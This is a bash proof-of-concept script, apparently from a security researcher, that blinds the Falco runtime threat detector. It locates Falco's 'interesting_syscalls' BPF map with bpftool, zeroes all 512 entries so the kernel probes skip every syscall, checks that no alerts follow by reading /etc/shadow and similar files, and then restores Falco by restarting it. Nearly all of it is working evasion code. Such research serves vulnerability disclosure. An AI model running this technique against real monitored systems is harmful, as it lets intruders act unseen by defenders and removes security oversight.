#!/bin/bash
# BPF Map Poisoning PoC: Total Falco Blindness
# Researcher: Azizcan Daştan — Milenium Security
# Date: 2026-05-27
#
# Demonstrates complete evasion of Falco (falcosecurity/falco) by zeroing
# the interesting_syscalls BPF array map.
#
# Falco's kernel-side BPF probes check interesting_syscalls[NR] before
# processing any syscall event. Setting all entries to 0 makes the BPF
# program skip every syscall at kernel level — no events reach userspace.
#
# Requirements:
#   - Linux kernel 5.8+ with BPF support
#   - CAP_BPF or CAP_SYS_ADMIN
#   - bpftool, python3, Docker

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

CONTAINER="falco-poc-test"

log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }

cleanup() {
    log "Cleaning up..."
    docker rm -f "$CONTAINER" 2>/dev/null || true
}

find_interesting_syscalls_id() {
    bpftool map list -j 2>/dev/null | python3 -c "
import json, sys
maps = json.load(sys.stdin)
for m in maps:
    name = m.get('name', '')
    if 'interesting_sys' in name and m['type'] == 'array':
        print(m['id'])
        sys.exit(0)
sys.exit(1)
"
}

generate_falco_activity() {
    /bin/cat /etc/shadow > /dev/null 2>&1 || true
    /bin/ls /etc/shadow > /dev/null 2>&1 || true
    /bin/bash -c "echo test" > /dev/null 2>&1
    /usr/bin/whoami > /dev/null 2>&1
    /usr/bin/id > /dev/null 2>&1
    cp /etc/passwd /tmp/falco-test-copy 2>/dev/null || true
    rm /tmp/falco-test-copy 2>/dev/null || true
}

count_alerts() {
    docker logs "$CONTAINER" 2>&1 | grep -c "Warning\|Notice\|Error\|Critical\|Alert" || echo "0"
}

echo ""
echo "============================================================"
echo "  BPF Map Poisoning PoC: Total Falco Blindness"
echo "  Researcher: Azizcan Daştan — Milenium Security"
echo "============================================================"
echo ""

# Phase 0: Setup
log "Starting Falco container..."
docker rm -f "$CONTAINER" 2>/dev/null || true
docker run -d --name "$CONTAINER" \
    --privileged \
    --pid=host \
    -v /etc/os-release:/etc/os-release-host:ro \
    -v /boot:/boot:ro \
    -v /lib/modules:/lib/modules:ro \
    -v /sys/kernel/debug:/sys/kernel/debug \
    -v /dev:/host/dev \
    -v /proc:/host/proc:ro \
    falcosecurity/falco:latest 2>/dev/null

log "Waiting for Falco to initialize (15s)..."
sleep 15

# Phase 1: Find interesting_syscalls map
log "Phase 1: Locating interesting_syscalls map..."
MAP_ID=$(find_interesting_syscalls_id)
if [ -z "$MAP_ID" ]; then
    fail "Could not find interesting_syscalls map"
    cleanup
    exit 1
fi
ok "Found interesting_syscalls map: ID=$MAP_ID"

# Check key syscalls
for nr in 59 257 56; do
    KEY=$(printf '%02x %02x %02x %02x' $((nr & 0xff)) $(((nr >> 8) & 0xff)) 0 0)
    VAL=$(bpftool map lookup id "$MAP_ID" key hex $KEY -j 2>/dev/null | python3 -c "
import json,sys;d=json.load(sys.stdin);v=d.get('value',[]);print(int(v[0],16) if isinstance(v[0],str) else v[0])
" 2>/dev/null)
    ok "  syscall $nr: interesting=$VAL"
done

# Phase 2: Baseline
log "Phase 2: Establishing baseline..."
BASELINE_BEFORE=$(count_alerts)
sleep 1
generate_falco_activity
sleep 4
BASELINE_AFTER=$(count_alerts)
BASELINE_ALERTS=$((BASELINE_AFTER - BASELINE_BEFORE))

if [ "$BASELINE_ALERTS" -eq 0 ]; then
    fail "Falco not generating alerts. Aborting."
    cleanup
    exit 1
fi
ok "Baseline: $BASELINE_ALERTS alerts (Falco is working)"

# Phase 3: POISON
echo ""
log "Phase 3: POISONING interesting_syscalls (all 512 entries -> 0)..."

python3 -c "
import subprocess
for i in range(512):
    key = f'{i & 0xff:02x} {(i >> 8) & 0xff:02x} 00 00'
    subprocess.run(f'bpftool map update id $MAP_ID key hex {key} value hex 00',
                   shell=True, capture_output=True)
print('Done')
"
ok "All 512 syscall entries zeroed"

# Verify
for nr in 59 257 56; do
    KEY=$(printf '%02x %02x %02x %02x' $((nr & 0xff)) $(((nr >> 8) & 0xff)) 0 0)
    VAL=$(bpftool map lookup id "$MAP_ID" key hex $KEY -j 2>/dev/null | python3 -c "
import json,sys;d=json.load(sys.stdin);v=d.get('value',[]);print(int(v[0],16) if isinstance(v[0],str) else v[0])
" 2>/dev/null)
    ok "  syscall $nr: interesting=$VAL (was 1)"
done

# Phase 4: Blindness test
echo ""
log "Phase 4: Testing Falco blindness..."
POISON_BEFORE=$(count_alerts)
sleep 1
generate_falco_activity
generate_falco_activity
sleep 5
POISON_AFTER=$(count_alerts)
POISON_ALERTS=$((POISON_AFTER - POISON_BEFORE))

echo ""
echo "============================================================"
if [ "$POISON_ALERTS" -eq 0 ]; then
    ok "TOTAL BLINDNESS CONFIRMED!"
    ok "Falco generated ZERO alerts after BPF map poisoning."
    ok "Baseline: $BASELINE_ALERTS alerts"
    ok "Poisoned: $POISON_ALERTS alerts"
    echo ""
    ok "Attack: zeroed interesting_syscalls array (ID=$MAP_ID)"
    ok "  512 entries set to 0 — BPF probes skip ALL syscalls"
    ok "  Maps not pinned but enumerable via bpf(BPF_MAP_GET_NEXT_ID)"
else
    fail "Partial: $POISON_ALERTS alerts (vs $BASELINE_ALERTS baseline)"
fi
echo "============================================================"

# Phase 5: Restore
echo ""
log "Phase 5: Restoring Falco (restart required)..."
docker restart "$CONTAINER" 2>/dev/null
sleep 12

RESTORE_BEFORE=$(count_alerts)
generate_falco_activity
sleep 4
RESTORE_AFTER=$(count_alerts)
RESTORE_ALERTS=$((RESTORE_AFTER - RESTORE_BEFORE))

if [ "$RESTORE_ALERTS" -gt 0 ]; then
    ok "Falco recovered: $RESTORE_ALERTS alerts after restart"
else
    warn "Falco did not recover"
fi

echo ""
echo "============================================================"
echo "  Summary"
echo "============================================================"
echo "  Baseline alerts:      $BASELINE_ALERTS"
echo "  Post-poison alerts:   $POISON_ALERTS"
echo "  Post-restore alerts:  $RESTORE_ALERTS"
echo "  Attack surface:       interesting_syscalls (BPF array, ID=$MAP_ID)"
echo "  Entries modified:     512 (all syscalls)"
echo "  Required capability:  CAP_BPF"
echo "============================================================"
echo ""

cleanup
